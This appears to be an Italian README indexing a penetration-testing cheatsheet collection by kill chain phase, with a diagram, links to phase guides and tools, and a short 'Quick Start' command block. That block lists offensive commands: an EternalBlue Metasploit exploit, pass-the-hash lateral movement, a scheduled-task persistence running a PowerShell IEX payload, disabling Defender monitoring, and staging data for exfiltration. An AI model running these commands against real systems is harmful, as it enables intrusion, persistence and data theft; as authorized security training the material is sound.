# 🎯 Metodologia di Attacco - Kill Chain

```
   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ██╗  ██╗██╗██╗     ██╗          ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██║ ██╔╝██║██║     ██║         ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
  ███████║   ██║      ██║   ███████║██║     █████╔╝     █████╔╝ ██║██║     ██║         ██║     ███████║███████║██║██╔██╗ ██║
  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ██╔═██╗ ██║██║     ██║         ██║     ██╔══██║██╔══██║██║██║╚██╗██║
  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ██║  ██╗██║███████╗███████╗    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

---

## 🎯 Cos'è la Attack Kill Chain?

La **Attack Kill Chain** (nota anche come **Cyber Kill Chain** o **MITRE ATT&CK**) descrive le fasi che un attaccante attraversa per compromettere ed eseguire exploit su un sistema o rete target.

---

## 📊 Fasi della Kill Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ATTACK LIFECYCLE                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 1. INITIAL   │───▶│ 2. DISCOVERY │───▶│ 3. PRIVILEGE         │        │
│   │    ACCESS    │    │ ENUMERATION  │    │    ESCALATION        │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│          │                                           │                      │
│          │                                           ▼                      │
│          │                               ┌──────────────────────┐          │
│          │                               │ 4. LATERAL           │          │
│          │                               │    MOVEMENT          │          │
│          │                               └──────────────────────┘          │
│          │                                           │                      │
│          ▼                                           ▼                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 7. ACTIONS   │◀───│ 6. DEFENSE   │◀───│ 5. PERSISTENCE       │        │
│   │ ON OBJECTIVES│    │    EVASION   │    │                      │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📖 Guide per Fase

| Fase | Descrizione | Guida |
|------|-------------|-------|
| **1. Initial Access** | Primo punto d'accesso al target | [📄 Visualizza](./01-Initial-Access.it.md) |
| **2. Discovery/Enumeration** | Raccolta di informazioni sul sistema compromesso | [📄 Visualizza](./02-Enumeration.it.md) |
| **3. Privilege Escalation** | Elevazione dei privilegi ad admin/root | [📄 Visualizza](./03-Privilege-Escalation.it.md) |
| **4. Lateral Movement** | Spostamento laterale nella rete verso altri sistemi | [📄 Visualizza](./04-Lateral-Movement.it.md) |
| **5. Persistence** | Mantenimento dell'accesso dopo riavvii/rilevamento | [📄 Visualizza](./05-Persistence.it.md) |
| **6. Defense Evasion** | Elusione di AV, EDR e controlli di sicurezza | [📄 Visualizza](./06-Defense-Evasion.it.md) |
| **7. Actions on Objectives** | Raggiungimento dell'obiettivo finale (esfiltrazione, impatto) | [📄 Visualizza](./07-Actions-Objectives.it.md) |

---

## 🔗 Cheatsheet Correlate

### Per Fase

| Fase | Strumenti Correlati |
|------|---------------------|
| Initial Access | [Metasploit](../Metasploit/translations/README.it.md), [SQLMap](../SQLMap/translations/README.it.md), [Hydra](../Hydra/translations/README.it.md) |
| Enumeration | [Nmap](../Nmap/translations/README.it.md), [BloodHound](../BloodHound/translations/README.it.md), [PowerView](../PowerView/translations/README.it.md) |
| Privilege Escalation | [Linux-PrivEsc](../Linux-PrivEsc/translations/README.it.md), [Windows-PrivEsc](../Windows-PrivEsc/translations/README.it.md) |
| Lateral Movement | [Impacket](../Impacket/translations/README.it.md), [CrackMapExec](../CrackMapExec/translations/README.it.md), [Evil-WinRM](../Evil-WinRM/translations/README.it.md) |
| Persistence | [PowerShell](../PowerShell/translations/README.it.md), [Metasploit](../Metasploit/translations/README.it.md) |
| Defense Evasion | [Mimikatz](../Mimikatz/translations/README.it.md), [PowerShell](../PowerShell/translations/README.it.md) |
| Data Exfiltration | [Linux-Commands](../Linux-Commands/translations/README.it.md) |

---

## 📚 Quick Start

### Tipico Flusso di Attacco
```bash
# 1. Initial Access - Sfrutta una vulnerabilità
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. Enumeration - Scopri a cosa hai accesso
whoami /all
systeminfo
net user

# 3. Privilege Escalation - Ottieni SYSTEM/root
.\winPEAS.exe

# 4. Lateral Movement - Spostati su altri sistemi
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. Persistence - Mantieni l'accesso
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. Defense Evasion - Disabilita AV
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. Actions on Objectives - Esfiltra dati
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```

---

## 📚 Risorse

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://www.unifiedkillchain.com/)

---

<p align="center">
  <b>🎯 Segui la Kill Chain!</b><br>
  <i>Solo per attività di penetration testing autorizzate!</i>
</p>
